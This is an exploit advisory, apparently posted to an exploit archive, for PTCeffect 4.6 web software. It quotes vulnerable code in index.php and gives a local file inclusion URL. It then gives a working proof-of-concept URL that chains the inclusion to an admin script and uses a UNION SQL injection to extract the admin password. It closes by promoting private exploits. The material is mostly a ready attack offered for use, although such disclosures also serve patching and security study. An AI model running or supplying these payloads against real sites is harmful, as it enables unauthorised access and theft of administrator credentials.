@@ -1,0 +1,37 @@
+# Exploit Title: PTCeffect LFI & SQL Injection Vulnerabilities 
+# Google Dork: find it :)
+# Date: 2014-04-19
+# Exploit Author: Walidz
+# Software Link: http://www.ptceffect.com/ 
+# Version: 4.6
+# Tested on: windows,linux,mac os
+# CVE : N/A
+
+The LFI vulnerability is in index.php
+ 
+--------------------[index.php]--------------------
+ 
+if ($input->g['view']) {
+        $filename = strtolower($input->g['view']) . ".php";
+ 
+[...]
+ 
+ 
+include SOURCES . $filename;
+ 
+ 
+--------------------[index.php]--------------------
+ 
+So you can include a fil by doing ; http://[site]/index.php?view=[file]
+ 
+ 
+By using the LFI, you can also include "admin files" which are especially unsecure, and let you inject SQL queries.
+ 
+As the file admin/sources/edit_loginad.php
+ 
+ 
+PoC ; http://[site]/index.php?view=../admin/Sources/edit_loginad&edit=-1%20union%20select%201,2,3,4,%28SELECT%20password%20FROM%20admin%29,6,7,8,9--%20-
+ 
+ 
+For more tools and priv8 exploit: http://security-dz.com
+For contact: admin@security-dz.com
